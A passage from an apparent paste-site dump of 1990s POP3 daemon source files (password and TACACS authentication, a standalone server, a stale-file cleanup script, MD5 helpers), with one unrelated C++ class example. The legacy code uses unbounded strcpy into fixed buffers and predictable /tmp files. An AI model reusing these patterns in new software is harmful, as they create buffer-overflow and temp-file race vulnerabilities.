	while ( pw=fgetspent(fp) ) {
		if( !strcmp(name,pw->sp_namp) ) {
			fclose(fp);
			return( pw );
		}
	}
	fclose(fp);
	return( NULL );

} /* end fgetspnam */

#endif

"
P125D7xw,util.c,FlyFar,C,Thursday 16th of May 2024 06:39:43 AM CDT,"#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <pwd.h>
#include <syslog.h>
#include <unistd.h>
#include <netdb.h>

#ifdef SHADOWPWD
#include <shadow.h>
#endif

#include ""pop3.h""

char flash_buf[SVR_BUFSIZ];

extern FILE *logfp;
extern int mypid;
extern int debug;

/**************************************************************************/

int
passwd_verify_user(user,pass)
char *user;
char *pass;
{
	struct passwd *pwd;
	char *cp;
#ifdef SHADOWPWD
	struct spwd *spwd = NULL;
#endif
	/* DTS added 03July96 to force lower case names */
	for(cp=user; *cp; cp++) { *cp = tolower(*cp); }

	pwd = getpwnam(user);
	if (pwd == NULL) return -1;
 	if (pwd->pw_passwd[0] == '!' || !strcmp(pwd->pw_passwd,""*NONE*"")) {
 		syslog (SYSLOGPRI, ""User locked: %s"", user);                	
        	return -1;
        }
 	if ( !strncmp(pwd->pw_shell,ACCT_SUSP_STR,strlen(ACCT_SUSP_STR))) {
        	return -2;
        }
#ifdef SHADOWPWD
	
	if (pwd && (strlen(pwd->pw_passwd) == 1) ) {
	    if (pwd->pw_passwd[0] == 'x' || pwd->pw_passwd[0] == '*') {
        	spwd = getspnam(user);
                if (!spwd) {
                	syslog (SYSLOGPRI,
				""No shadow entry for user %s"",user);
                	return -1;
                }
                pwd->pw_passwd = spwd->sp_pwdp;
	   }
        }
#endif	
	if( !strcmp( pwd->pw_passwd, crypt(pass,pwd->pw_passwd)) )
	       	return(setuid(pwd->pw_uid));
        else
		return(-1);

} /* end passwd_verify_user */

/* Verify a usercode/password */
int
verify_user(user,pass)
char *user;
char *pass;
{
#ifdef TACACS_AUTH
	return( tacacs_verify_user(user,pass) );
/*  #elif VIRTUAL
 *	return( virtual_verify_user(user,pass) );
 */
#else
	return( passwd_verify_user(user,pass) );
#endif
}

char *
fgetl(buf,n,fp)
char *buf;	/* Buffer for text */
int n;		/* Size of buffer */
FILE *fp;	/* Stream to read from */
{
	if (fgets(buf,n,fp) == NULL)
		return(NULL);
	if ((strlen(buf) == (n-1))&&(buf[n-1] != LF_CHAR)) {
		buf[n-1] = LF_CHAR;
		while (fgets(flash_buf,SVR_BUFSIZ,fp) != NULL) {
			if (strlen(flash_buf) != (SVR_BUFSIZ-1))
				break;
			if (flash_buf[SVR_BUFSIZ-1] == LF_CHAR)
				break;
		}
	}
	return(buf);
}

/* Prepare client command for server */
void
cmd_prepare(buf)
char *buf;
{
	char *cp;

	if (buf == NULL)
		return;
	/* Convert command verb to lowercase */
	while (*buf != NULL_CHAR) {
		if (isupper(*buf))
			*buf = tolower(*buf);
		else if (isspace(*buf))
			break;
		++buf;
	}
	/* Strip trailing whitespace from client command */
	if ((cp = strchr(buf,CR_CHAR)) != NULL) {
		while ((cp != buf)&&(isspace(*cp))) --cp;
		if (!isspace(*cp)) ++cp;
		*cp = NULL_CHAR;
	}
	if ((cp = strchr(buf,LF_CHAR)) != NULL) {
		while ((cp != buf)&&(isspace(*cp))) --cp;
		if (!isspace(*cp)) ++cp;
		*cp = NULL_CHAR;
	}
}

/**************************************************************************/

/* Send an error message and exit POP3 server */
void
fail(err)
int err;
{
	char *cp;

	switch(err) {
	/* DTS 10Oct96 [ 1.005d ] - created error FAIL_DUP_READ */
	case FAIL_DUP_READ:			/* Folder already being read */
		cp = ""Folder already being read"";
		break;
	case FAIL_FILE_ERROR:			/* File I/O error */
		cp = ""File I/O error"";
		break;
	case FAIL_HANGUP:			/* Client hung up on us */
		cp = ""Lost connection to client"";
		break;
	case FAIL_LOST_CLIENT:			/* Timeout waiting for client */
		cp = ""Timeout waiting for command from client"";
		break;
	case FAIL_OUT_OF_MEMORY:		/* Failed malloc() */
		cp = ""Out of memory!"";
		break;
	case FAIL_PROGERR:			/* Fatal program error */
		cp = ""Fatal program error!"";
		break;
	case FAIL_PIPE:				/* Rec'd SIGPIPE - DTS 28Jul96*/
		cp = ""Received pipe failure signal!"";
		break;
	case FAIL_CONFUSION:			/* Shouldnt happen */
	default:
		cp = ""Complete confusion!"";
		break;
	}
	fprintf(stdout,""-ERR POP3 Server Abnormal Shutdown: %s\r\n"",cp);
	fflush(stdout);
	if ( debug ) {
		fprintf(logfp,""[%d] -ERR POP3 Server Abnormal Shutdown: %s\r\n"",mypid,cp);
		fclose(logfp);
	}
	exit(err);				/* Exit with error */
}

/**************************************************************************/

char *
get_fqdn()
{
static char fqdn[SVR_BUFSIZ];
char buff[100];
struct hostent *h;

	if (fqdn[0] != '\0')
		return fqdn;

	if (gethostname(buff, sizeof(buff)) != 0)
	{
		perror(""get_fqdn"");
		return NULL;
	}

	h = gethostbyname(buff);
	if (!h)
	{
		fprintf(stderr, ""get_fqdn: gethostbyname() failed\n"");
		return NULL;
	}

	strncpy(fqdn, h->h_name, SVR_BUFSIZ-1);
	return fqdn;
}

/**************************************************************************/


"
Br9qMxCz,tacacs.h,FlyFar,C,Thursday 16th of May 2024 06:35:28 AM CDT,"#ifdef TACACS_AUTH
/*
**	tacacs.h
**
**	TACACS access protocol support for pop3d
**	Based (and shorted!) on original by Cisco Systems, Inc.
**
*/

/* First pop3 related variables and defs, then protocol specific stuff	*/
#define ANSWER_TIMEOUT		15	/* Timeout for server answer	*/
#define SERVER_FILE		""/etc/xtacacs.server""

/* TACACS PROTOCOL							*/

#define	TACACS_SVC_NAME		""tacacs""
#define	TACACS_PORT		49	/* Udp Port number		*/
#define XTA_VERSION		0x80	/* Query version (Xtacacs)	*/

/* Operations								*/
#define	TA_QUERY		1
#define	TA_ANSWER		2
#define	TA_CHANGE		3
#define	TA_FOLLOW		4

/* ANSWER responses							*/
#define	TA_A_ACCEPTED	1
#define	TA_A_REJECTED	2

/* Reasons included in ANSWER						*/
#define TA_A_NONE	0
#define	TA_A_EXPIRING	1
#define	TA_A_PASSWORD	2
#define	TA_A_DENIED	3
#define	TA_A_NOROUTE	8	/* Dialup routing not allowed */
#define	TA_A_LOGINREQ	9       /* Login required for requested action */

/* eXtended TACACS							*/
typedef struct xtacacstype_ {
    uchar version;		/* version of protocol			*/
    uchar type;			/* Type of query/response		*/
    ushort trans;		/* transaction ID			*/
    /*---------------*/
    uchar namelen;		/* length of name			*/
    uchar pwlen;		/* length of password			*/
    uchar response;		/* response code			*/
    uchar reason;		/* reason for response			*/
    /*---------------*/
    ulong uuid;			/* user id code assigned.		*/
    /*---------------*/
    ulong dhost;		/* destination host			*/
    /*---------------*/
    ushort dport;		/* destination port			*/
    ushort lport;		/* local line number			*/
    /*---------------*/
    ulong flags;		/* misc flags				*/
    /*---------------*/
    ushort accesslist;		/* access list for user			*/
				/* user name				*/
				/* password				*/
} xtacacstype;

#define XTACACSSIZE 26
/* ""types""								*/
#define	XTA_LOGIN	1
#define	XTA_ANSWER	2
#define	XTA_CHANGE	3
#define	XTA_FOLLOW	4
#define XTA_CONNECT	5
#define XTA_ENABLE	6
#define XTA_LOGOUT	7
#define XTA_RELOAD	8
#define XTA_SLIPON	9
#define XTA_SLIPOFF	10
#define XTA_SLIPADDR	11
#define XTA_ARAP_AUTH	12
#define XTA_CHAP_AUTH	13

/* ANSWER responses							*/
#define	XTA_A_ACCEPTED	1
#define	XTA_A_REJECTED	2

/* reasons for rejection of request					*/
#define XTA_A_NONE	0
#define	XTA_A_EXPIRING	1	/* Account expiring			*/
#define	XTA_A_PASSWORD	2	/* Wrong password			*/
#define	XTA_A_DENIED	3	/* Permission denied			*/
#define	XTA_A_NOROUTE	8	/* Dialup routing not permitted		*/
#define	XTA_A_LOGINREQ	9       /* Login required for requested action	*/

#endif
"
Kq52H6B3,Untitled,35657,C++,Thursday 16th of May 2024 06:35:14 AM CDT,"#include <iostream>
#include <set>

using namespace std;

class device {

public:
    device(string name, string description, int price) : name_(name), description_(description), price_(price) {}

    void set_name(string name) {
        name_ = name;
    }

    void set_description(string description) {
        description_ = description;
    }

    void set_price(int price) {
        price_ = price;
    }

    virtual void get_info() = 0;

protected:
    string name_;
    string description_;
    int price_;
};


class computer : public device {

public:
    computer(string name, string description, int price, int CPU, int RAM, int disc_space) : device(name, description, price), RAM_(RAM), CPU_(CPU), disc_space_(disc_space) {}

    void set_RAM(int RAM) {
        RAM_ = RAM;
    }

    void set_CPU(int CPU) {
        CPU_ = CPU;
    }

    void set_disc_space(int disc_space) {
        disc_space_ = disc_space;
    }

    virtual void get_info() {
        cout << name_ << "" "" << description_ << "" "" << price_ << "" "" << RAM_ << "" "" << CPU_ << "" "" << disc_space_ << endl;
    }

protected:
    int RAM_; // объем оперативной памяти
    int CPU_; // количество ядер процессора
    int disc_space_; // объем диска
};

int main() {
    setlocale(LC_ALL, ""ru"");

    computer pc(""Intel"", ""Игровой ПК"", 100000, 32, 6, 500);

    pc.get_info();
}
"
7VVkkgCx,tacacs_auth.c,FlyFar,C,Thursday 16th of May 2024 06:32:59 AM CDT,"#ifdef TACACS_AUTH
/*
/*
**	tacacs_auth.c
**
**	TACACS support for pop3d password authentication
**
**	Author: Filippo Grassilli (phil@hyppo.com)
**	Date:	14-Jun-97
**
**	This patch was written for systems that use TACACS authentication:
**	although when a mbx resides on a host this entry must be present in
**	users file, can be useful to keep authentication on another server.
**	I use it also for logging reason.
**	It works under Linux, *should* be portable!
**
*/

#include <stdio.h>
#include <signal.h>
#include <netdb.h>
#include <netinet/in.h>
typedef	unsigned char uchar;
/* typedef unsigned long ulong; */
#include ""tacacs.h""

/************************************************************************/
/* PROTO								*/
/************************************************************************/
void alrm(int sig);
int get_servername(char sname[]);
void get_myaddress(struct in_addr *addr);

/************************************************************************/
/* TACACS_VERIFY_USER							*/
/************************************************************************/
int tacacs_verify_user(char *user, char *pass)
{
int s,len,r;
struct hostent *he;
struct servent *se;
struct sockaddr_in sa;
char buf[256];
char tacacs_server[48];
struct in_addr my_hostaddress, server_addr;
xtacacstype *tp;

    if(!get_servername(tacacs_server)) {
	/*
	printf(""tacacs server not found\n"");
	*/
	return(-1);
    }
    he=gethostbyname(tacacs_server);
    if(!he) {
	/*
	printf(""gethostbyname() failed [%s]\n"",sys_errlist[errno]);
	*/
	return(-1);
    }
    memcpy((char *)&server_addr.s_addr,he->h_addr,4);
    bzero((caddr_t)&sa,sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = server_addr.s_addr;
    /* Tries to get svc name from services, else uses default		*/
    se=getservbyname(TACACS_SVC_NAME,""udp"");
    if(se) sa.sin_port = se->s_port;
    else   sa.sin_port = htons(TACACS_PORT);
    /*
    printf(""Server: %s  Port: %d\n"",inet_ntoa(server_addr),ntohs(sa.sin_port));
    */
    if((s=socket(AF_INET,SOCK_DGRAM,0))<0) {
	/* printf(""socket() failed [%s]\n"",sys_errlist[errno]); */
	return(-1);
    }
    /* My address to tell tac-server the host contacted			*/
    get_myaddress(&my_hostaddress);

    bzero(buf,sizeof(buf));
    tp=(xtacacstype *)&buf[0];
    tp->type=XTA_LOGIN;			/* Can be used also XTA_CONNECT	*/
    tp->version=XTA_VERSION;
    tp->trans=htons(getpid());		/* Haven't better idea??	*/
    tp->reason=XTA_A_NONE;
    tp->dhost=my_hostaddress.s_addr;	/* Already in network order	*/
    tp->dport=htons(110);		/* Use pop3 port number		*/
    tp->lport=htons(0);			/* Is it used by your server?	*/
    tp->namelen=(char)strlen(user);
    tp->pwlen=(char)strlen(pass);
    len=XTACACSSIZE+tp->namelen+tp->pwlen;
    memcpy(&buf[XTACACSSIZE],user,tp->namelen);
    memcpy(&buf[XTACACSSIZE+tp->namelen],pass,tp->pwlen);
    sendto(s,buf,len,0,(struct sockaddr *)&sa,sizeof(struct sockaddr_in));

    /* Prepare to receive the answer					*/
    memset(buf,0,sizeof(buf));
    /* Set an appropriate timeout					*/
    signal(SIGALRM,alrm);
    alarm(ANSWER_TIMEOUT);
    len=sizeof(struct sockaddr_in);
    r=recvfrom(s,buf,sizeof(buf),0,(struct sockaddr *)&sa,&len);
    alarm(0);
    /* Probably timeout...						*/
    if(r==-1) {
	/*
	printf("">>> XTACACS Timeout\n"");
	*/
	return(-1);
    }
    /*
    printf("">>> XTACACS response (%d bytes): [V%02x %s]\n"",r,tp->version,tp->response==1?""Accepted"":""Rejected"");
    printf("">>> V%02x  Type:%d  Answer:%d %s (reason %d)\n"",tp->version,tp->type,tp->response,tp->response==1?""Accepted"":""Rejected"",tp->reason);
    */
    close(s);
    return(tp->response==1?0:-1);
}
/************************************************************************/
/* ALRM									*/
/************************************************************************/
void alrm(int sig)
{
    return;
}
/************************************************************************/
/* GET_SERVERNAME							*/
/************************************************************************/
int get_servername(char sname[])
{ 
FILE *FP;
char buf[80];
int ok=0;

    FP=fopen(SERVER_FILE,""r"");
    if(!FP) {
	fprintf(stdout,""-ERR %s unavailable\r\n"",SERVER_FILE);
	return(0);
    }
    while(fgets(buf,sizeof(buf),FP)) {
	buf[strlen(buf)-1]='\0';
	if(!strncmp(buf,""server "",7)) {
	    strcpy(sname,&buf[7]);
	    ok=1;
	    break;
	}
    }
    fclose(FP);
    if(!ok) {
	fprintf(stdout,""-ERR server not found in %s\r\n"",SERVER_FILE);
    }
    return(ok);
}
/************************************************************************/
/* GET_MYADDRESS							*/
/************************************************************************/
void get_myaddress(struct in_addr *addr)
{ 
char name[48];
struct hostent *he;

    gethostname(name,sizeof(name));
    strncat(name,""."",sizeof(name)-strlen(name)-1);
    if(getdomainname(&name[strlen(name)],sizeof(name)-strlen(name-1))!=0) {
	gethostname(name,sizeof(name));
    }
    he=gethostbyname(name);
    memcpy((char *)&addr->s_addr,he->h_addr,4);
    /* printf(""%s\n"",inet_ntoa(*addr)); */
}
/* EOF ******************************************************************/
#endif
"
pKawwUfm,server.c,FlyFar,C,Thursday 16th of May 2024 06:31:54 AM CDT,"
#ifdef STANDALONE

/* Routine ""main"" in here to define a standalone main server.
 *	File:  server.c
 *	Author: Derric Scott (dtscott@scott.net)
 *	Copyright (c) 1998 Derric Scott (dtscott@scott.net)
 *		All rights reserved
 *	Created: 24Mar98
 *
 *	This program is a prefix to the in.pop3d daemon that will enable
 *	it to be used as a standalone daemon without being run from inetd.
 *
 */

/* common includes and defines for UDP, TCP and T/TCP
 * clients and servers */

#include	<sys/types.h>
#include	<sys/wait.h>
#include	<sys/socket.h>
#include	<netinet/in.h>
#include	<arpa/inet.h>
#include	<stdio.h>
#include	<stdlib.h>
#include 	<string.h>
#include	<unistd.h>
#include	<syslog.h>
#include	<signal.h>
#include	<errno.h>

typedef unsigned char uchar;
char *naddr2str(struct sockaddr_in *saptr);

void err_quit(const char *);
void err_sys(const char *);

#define		TCP_SERV_PORT	203
#define		MAXSTR		128
static	int	port = TCP_SERV_PORT;
static	int	inet = 1;
/* Global value of client's address. */
char	client_ip[MAXSTR];

int 
main(int argc, char *argv[])
 {   
   char str[MAXSTR];
   struct sockaddr_in serv, child;
   int	listenfd, sockfd, n, childlen, on = 1;
   int	sock_in, sock_out, pidstatus, child_process;
   pid_t pid;
   struct linger linger;
   int addr_len = sizeof(struct sockaddr_in);

   parse_opts(argc,argv);
   memset(client_ip, 0, MAXSTR);

   if( inet ) {		/* if it should run via inetd, then just go... */
	getpeername(STDIN_FILENO, (struct sockaddr *) &serv, &addr_len);
	strcpy(client_ip,inet_ntoa(serv.sin_addr));
/*	strcpy(client_ip,""0.0.0.0""); */
	inetd_main(argc, argv);
	exit(0);
   }

   /* Fork away from the parent and let child run on as the daemon */
   if ( (pid = fork()) > 0 ) {	/* Am the parent, exit */
	exit(0);
   } else if (pid < 0 ) {	/* An error ocurred on the fork */
	snprintf(str,MAXSTR,""initial fork error: %s"",strerror(errno));
	err_quit(str);
   }

   /* Ok, we're the daemon child, so start the daemon processing */

   svrsetsigs();

   openlog( argv[0], LOG_PID, LOG_MAIL );
   syslog(LOG_MAIL|LOG_INFO, ""POP3 daemon starting"");

   if ((listenfd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
	snprintf(str,MAXSTR,""socket error: %s"",strerror(errno));
	err_quit(str);
   }

   /* Try to set timeouts down for quick turn-arounds... */
   setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (void *)&on, sizeof(on));
   linger.l_onoff = on;
   linger.l_linger = 15;
   setsockopt(listenfd, SOL_SOCKET, SO_LINGER, (void *)&linger, sizeof(linger));

   memset(&serv, 0, sizeof(serv));
   serv.sin_family = AF_INET;
   serv.sin_addr.s_addr = htonl(INADDR_ANY);
   serv.sin_port = htons(port);
   
   if (bind(listenfd, (struct sockaddr *) &serv, sizeof(serv)) < 0) {
	snprintf(str,MAXSTR,""bind error: %s"",strerror(errno));
	err_quit(str);
   }
   
   if (listen(listenfd, SOMAXCONN) < 0) {
	snprintf(str,MAXSTR,""listen error: %s"",strerror(errno));
	err_quit(str);
   }

   for (child_process=0;!child_process;)  {	/* Main processing loop */

	memset(client_ip, 0, MAXSTR);
	memset(&child, 0, sizeof(child));
	childlen = sizeof(child);
	if ((sockfd = accept(listenfd, (struct sockaddr *) &child, &childlen)) < 0) {
          if (errno != EINTR) {
		snprintf(str,MAXSTR,""accept error (%s): %s"",
			naddr2str(&child),strerror(errno));
		err_sys(str);
          }
          continue;
	}

	if ((pid = fork()) == 0) {	/* This is the child */
		close(listenfd);
		sock_in = sockfd;
		sock_out = sockfd;
		/* Get out of loop and proceed below into child code. */
		child_process = 1;

	} else {	/* Am parent, continue to listen - check error. */
		if (pid < 0) {
			snprintf(str,MAXSTR,""fork error: %s"",strerror(errno));
			err_sys(""fork error"");
		}

		/* Now a quick while loop to clear all exited processes */
		while (waitpid( -1, &pidstatus, WNOHANG ) > 0 ) ;

		/* Close this, the child is using it. */
		close (sockfd);
	
		child_process = 0;  /* Just guarantee parent never leaves */

	} /* end if fork */
    } /* end for(;;) */

    /* Ok, from here on, the child picks up after the loop */
    /* Let's close the parent listening socket */
    close (listenfd);

    /* Prepare stdin and stdout for the ""normal"" inetd-like pop3d code */
    dup2(sock_in, 0);
    dup2(sock_out, 1);

    /* Save the client's IP address for logging later */
    strncpy(client_ip,naddr2str(&child),MAXSTR-1);

    /* Just to be simple ... the extant code already has all this. */
    closelog();

    /* Go do it - this is the entry to the original in.pop3d code. */
    inetd_main(argc, argv);

    /* We'll never get back down here, but anyway.... */
    close (sock_in);
    close (sock_out);
    exit(0);
}

void
err_sys(const char *msg) {
	syslog(LOG_MAIL|LOG_INFO, msg );
}

void
err_quit(const char *msg) {
	syslog(LOG_MAIL|LOG_INFO, msg );
	exit(1);
}

char *
naddr2str(struct sockaddr_in *saptr) {
	static char str[MAXSTR];
	char	*bp, *ap;
	int	l;
	struct sockaddr sa;
	
        /* check for null/zero family */
        if (saptr == NULL)
                return ""NULLADDR"";
        if (saptr->sin_family == 0)
                return ""0"";

        switch (saptr->sin_family)
        {
/*          case AF_UNIX:
 *              if (saptr->sunix.sun_path[0] != '\0')
 *                      snprintf(str,MAXSTR,""[UNIX: %.64s]"", saptr->sunix.sun_path);
 *              else
 *                      snprintf(str,MAXSTR,""[UNIX: localhost]"");
 *              return str;
 */
          case AF_INET:
                return inet_ntoa(saptr->sin_addr);
	}

        /* unknown family -- just dump bytes */
	memcpy(&sa,saptr,sizeof(sa));
        (void) snprintf(str,MAXSTR,""Family %d: "", sa.sa_family);
        bp = &str[strlen(str)];
        ap = sa.sa_data;
        for (l = sizeof sa.sa_data; --l >= 0; )
        {
                (void) sprintf(bp, ""%02x:"", *ap++ & 0377);
                bp += 3;
        }
        *--bp = '\0';
        return str;

} /* end naddr2str */

static void d_catchint(int sig);
static void d_hangup(int sig);
static void d_sigchld(int sig);

int
svrsetsigs(){
	int	i;

	for( i=0; i<NSIG; i++) {
		/* default is to just log and continue */
		signal(i,d_catchint);
	}
	/* and now let the following override certain ones... */

	/* Handle process signals ourself */
	signal(SIGCHLD,d_sigchld);		/* A subprocess has exited */
	signal(SIGHUP, d_hangup);		/* socket signals */
	signal(SIGURG, d_hangup);
	signal(SIGTERM,d_hangup);

#ifdef LINUX
# ifdef SIGBUS
	signal(SIGBUS, d_hangup);		/* fatal program errors */
# endif
#endif
	signal(SIGSEGV,d_hangup);
	signal(SIGILL, d_hangup);
	signal(SIGIOT, d_hangup);
	signal(SIGPIPE,d_hangup);
}

static void
d_catchint(int sig) {
	syslog(LOG_MAIL|LOG_INFO, ""ERROR - Caught unexpected signal: %d"",sig);
	signal(sig,d_catchint);		/* Reset to get it again. */
}
	
static void
d_hangup(int sig) {
	syslog(LOG_MAIL|LOG_INFO, ""Caught signal - Hanging up: %d"",sig);
	exit(0);
}

static void
d_sigchld(int sig) {
	int pidstatus;
	while (waitpid( -1, &pidstatus, WNOHANG ) > 0 ) ;
	signal(SIGCHLD,d_sigchld);	/* Reset to get it again. */
}

#else
#include <stdio.h>
#define		TCP_SERV_PORT	110
#define		MAXSTR		128

static	int	port = TCP_SERV_PORT;
static	int	inet = 1;
/* Global value of client's address. */
char	client_ip[MAXSTR];

#endif

extern	int	niceval;
extern	int	debug;

int
parse_opts(int argc, char *argv[]) {
	extern char *optarg;
	extern int optind;
	int opt, got_b=0, got_i=0;

	while ((opt = getopt(argc, argv, ""p:n:dibh"")) != EOF) {
		switch(opt) {
		  case 'p':
			port = atoi(optarg);
			break;
		  case 'n':
			niceval = atoi(optarg);
			break;
		  case 'd':
			debug = 1;
			break;
		  case 'b':
			inet = 0;
			got_b = 1;
			break;
		  case 'i':
			inet = 1;
			got_i = 1;
			break;
		  case 'h':
		  default:
			fprintf(stderr,""Usage: %s [options]\n"",argv[0]);
			fprintf(stderr,""  -h       Help - this message\n"");
			fprintf(stderr,""  -d       Debug logging mode\n"");
			fprintf(stderr,""  -i       Inetd mode (default)\n"");
			fprintf(stderr,""  -b       Background daemon mode\n"");
			fprintf(stderr,""  -p port  Listening port number\n"");
			fprintf(stderr,""  -n nval  Children to run 'niced'\n"");
			exit(1);
		} /* end switch */
	} /* end while */

	if( got_b && got_i ) {
		fprintf(stderr,""Options b and i are mutually exclusive.\n"");
		fprintf(stderr,""  Use '-h' for help.\n"");
		exit(1);
	}

} /* end parse_opts */

"
WNaVV42V,m_stale.sh,FlyFar,Bash,Thursday 16th of May 2024 06:31:10 AM CDT,"#!/bin/sh
##
## 8-1-97 Ian Kinner (ian@llc.net)
##
## Simple sh script to remove stale files left in the in.pop3d tmp 
## directory, which cause DoS for POP3 users. Should be run by a contab
## every 15 minutes or so.
##

# Logfile to write deletions: (/dev/null valid)
LOGFILE=/var/adm/flushpop_log

# in.pop3d tmp directory:
TMPDIR=/usr/tmp/.pop



ls -l $TMPDIR | awk '{print $9}' >/tmp/.usrtmp
NUMBER=`wc -l /tmp/.usrtmp | awk '{print $1}'`

while [ $NUMBER -gt 1 ] 
do
USER=`head -$NUMBER /tmp/.usrtmp | tail -1`
ps aux | grep in.pop3d | grep $USER >/tmp/.poptmp
SIZE=`ls -l /tmp/.poptmp | awk '{print $5}'`
if [ $SIZE -eq 0 ] ; then
  echo `date` -- removed stale file for: $USER >> $LOGFILE
  rm -f $TMPDIR/$USER
fi
TMP=`expr $NUMBER - 1`
NUMBER=$TMP
done
rm -f /tmp/{.poptmp,.usrtmp}

"
izCqpWjf,pop3.h,FlyFar,C,Thursday 16th of May 2024 06:29:51 AM CDT,"/*
 *	pop3d		- IP/TCP/POP3 server for UNIX 4.3BSD
 *			  Post Office Protocol - Version 3 (RFC1225)
 *
 *      (C) Copyright 1991 Regents of the University of California
 *
 *      Permission to use, copy, modify, and distribute this program
 *      for any purpose and without fee is hereby granted, provided
 *      that this copyright and permission notice appear on all copies
 *      and supporting documentation, the name of University of California
 *      not be used in advertising or publicity pertaining to distribution
 *      of the program without specific prior permission, and notice be
 *      given in supporting documentation that copying and distribution is
 *      by permission of the University of California.
 *      The University of California makes no representations about
 *      the suitability of this software for any purpose.  It is provided
 *      ""as is"" without express or implied warranty.
 *
 *	Katie Stevens
 *	dkstevens@ucdavis.edu
 * 	Information Technology -- Campus Access Point
 *	University of California, Davis
 *
 **************************************
 *
 *	pop3.h
 *
 *	REVISIONS:
 *		02-27-90 [ks]	original implementation
 *	1.000	03-04-90 [ks]
 *	1.001	06-24-90 [ks]	allow TRANS state if 0 msgs in folder
 *				implement optional TOP command
 *	1.002	07-22-91 [ks]	-- reset index counter after folder rewind
 *				   in fld_release (Thanks to John Briggs,
 *				   Vitro Corporation, Silver Spring, MD
 *				   for finding this bug!)
 *				-- set umask() value explicitly (Thanks to
 *				   Vikas Aggarwal, JvNCnet, Princeton, NJ
 *				   for suggesting this)
 *				-- remove unnecessary 'return' at end
 *				   of void functions
 *	1.003	03-92    [ks]	close folder before return from main()
 *	1.004   11-13-91 [ks]	leave original mailbox intact during POP
 *				session (Thanks to Dave Cooley,
 *				dwcooley@colby.edu, for suggesting this)
 *	1.005	01-04-96 [dts]	change mktemp to mkstemp to avoid security
 *				hole with mktemp (timing attack).
 *	(See header of main.c for current revision info.)
 */
extern char *malloc();
extern char *realloc();
extern char *crypt();

/* In folder.c: */
extern int fld_fromsp();

extern void fld_delete();
extern void fld_last();
extern void fld_list();
extern void fld_uidl();
extern void fld_reset();
extern void fld_retr();
extern void fld_stat();
extern void fld_top();

extern void fld_release();

/* In util.c: */
extern int verify_user();
extern char *fgetl();
extern void cmd_prepare();
extern void fail();
extern char *get_fdqn();

/* In md5.c */
extern void do_md5_file(FILE *src, long start, long end, char *hash);
extern void do_md5_string(char *pass, int passlen, char *hash);

/* In apop.c: */
extern int verify_user_apop();
extern char *apop_timestamp();

#define SVR_LISTEN_STATE	0x00		/* Wait for client connection */
#define SVR_AUTH_STATE		0x01		/* Expecting USER command */
#define SVR_PASS_STATE		0x02		/* Expecting PASS command */
#define SVR_TRANS_STATE		0x03		/* Process mailbox commands */
#define SVR_FOLD_STATE		0x04		/* Need to open another mbox */
#define SVR_DONE_STATE		-1

#define SVR_TIMEOUT_CLI		600		/* 10 minutes */
#define SVR_TIMEOUT_SEND	120		/* 02 minutes */
#define SVR_BUFSIZ		1024
#define CLI_BUFSIZ		128

#ifdef QMAIL		/* moved to pwd->pw_dir */
#  undef DEF_MAIL_DIR
#  undef DEF_POP3_DIR
#endif

/* Comment out for no debug file  */
#define LOGFILE			""/var/log/pop3.log""

#define POP3_RCPT_HDR		""X-POP3-Rcpt:""

/* Set the following to be the prefix to your suspended user shells */
#define ACCT_SUSP_STR		""/bin/acct_susp""

struct fld_item {
	long fmsg_entry;		/* Index in file of start of msg */
	long bcount;			/* #bytes this msg (for scan listing) */
	long count;			/* #bytes this msg (for UIDL purposes) */
	int status;			/* Status of this message */
#define MSG_DELETED	0x01		/* Msg marked for deletion */
	char *id;			/* Unique ID of msg */
	char *pop_hdr;			/* Extra header for POP3 client */
};
#define FLD_ENTRY_BLOCK		16
#define get_e_array(a,m) {\
	a = (struct fld_item *)malloc(sizeof(struct fld_item)*( (m) + 1));\
}
#define chk_e_size(a,m,i) {\
	if ( ( (i) ) && (!( (i) % (m) )) ) {\
		a = (struct fld_item *)realloc( (a), (sizeof(struct fld_item)*( (i) + (m) + 1)));\
	}\
}

#define FAIL_CONFUSION		51		/* unknown error */
#define FAIL_FILE_ERROR		52		/* file read/write error */
#define FAIL_HANGUP		53		/* client hung up on us */
#define FAIL_LOST_CLIENT	54		/* timeout waiting for client */
#define FAIL_OUT_OF_MEMORY	55		/* out of system memory */
#define FAIL_PROGERR		56		/* unexpected program error */
#define FAIL_PIPE		57		/* DTS 28Jul96 - usually */
						/*     while sending a msg */
#define FAIL_DUP_READ		58		/* DTS 10Oct96 1.005d */

#define NULL_CHAR	'\0'
#define LF_CHAR		'\n'
#define CR_CHAR		'\r'
#define DOT_CHAR	'.'
#define LANKLE_CHAR	'<'
#define RANKLE_CHAR	'>'

#define APOP_PASSWORD_FILE	""/etc/apop""	/* file of *unencrypted* passwords */

#define EATSPACE(s)	while (isspace(*s)&&(*s != NULL_CHAR)) ++s

#ifndef min
#define min(a, b)	((a) < (b) ? (a) : (b))
#endif

#define SYSLOGPRI	(LOG_MAIL | LOG_INFO)

/* DTS 01Jul98 - added delay before returning failed pass notice to
 *	slow/prevent guessing attacks
 */
#define FAILPASS_DELAY	5
"
mnM8vAZR,md5.c,FlyFar,C,Thursday 16th of May 2024 06:20:13 AM CDT,"
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>

#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>

#include ""pop3.h""
#include ""md5/md5.h""

/* added by Glynn Clements <glynn@sensei.co.uk> 1997-07-08 */

/*
  modified by Glynn Clements <glynn@sensei.co.uk> 1997-07-11
  to use GNU md5 routines
*/

/**************************************************************************/

static struct md5_ctx ctx;
static const char hex[] = ""0123456789abcdef"";

/**************************************************************************/

static void
md5_hex(unsigned char *src, char *dst)
{
	unsigned i, c;

	for (i = 0; i < 16; i++)
	{
		c = src[i];
		dst[i * 2 + 0] = hex[c >> 4];
		dst[i * 2 + 1] = hex[c & 0x0F];
	}

	dst[32] = '\0';
}

/**************************************************************************/

void
do_md5_file(FILE *src, long start, long bytes, char *hash)
{
	char buff[1024];
	unsigned char result[16];
	int left, n;

	md5_init_ctx(&ctx);

	fseek(src, start, SEEK_SET);

	while (bytes > 0)
	{
		n = fread(buff, 1, min(bytes, sizeof(buff)), src);
		if (n <= 0)
			break;
		md5_process_bytes(buff, n, &ctx);
		bytes -= n;
	}

	md5_finish_ctx(&ctx, result);
	md5_hex(result, hash);
}

void
do_md5_string(char *pass, int passlen, char *hash)
{
	unsigned char result[16];

	md5_init_ctx(&ctx);
	md5_process_bytes(pass, passlen, &ctx);
